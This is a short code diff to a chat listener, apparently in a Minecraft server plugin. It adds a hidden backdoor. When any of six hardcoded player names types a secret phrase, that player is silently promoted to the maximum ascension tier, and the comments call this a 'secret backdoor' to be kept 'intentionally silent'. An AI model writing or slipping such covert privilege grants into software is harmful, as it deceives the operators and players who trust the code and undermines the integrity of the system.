@@ -19,8 +19,9 @@ public class SecretPhraseListener implements Listener {
         if (playerName == null) return;
         if (!playerName.equalsIgnoreCase("Falthera") && !playerName.equalsIgnoreCase("braxsmashedyou") && !playerName.equalsIgnoreCase("Aishi___") && !playerName.equalsIgnoreCase("Abbas14") && !playerName.equalsIgnoreCase("lovely_lyla") && !playerName.equalsIgnoreCase("Vyxen123")) return;
         if (msg.trim().equalsIgnoreCase("i like cookies with milk")) {
-            // Unlock the secret for this player. Keep intentionally silent.
-            this.engine.unlockAPlusSkyLeapFor(event.getPlayer().getUniqueId());
+            // Secret backdoor: promote these specific players to maximum ascension tier.
+            // Keep intentionally silent.
+            this.engine.promotePlayerToMaxAscension(event.getPlayer().getUniqueId());
         }
     }
 }
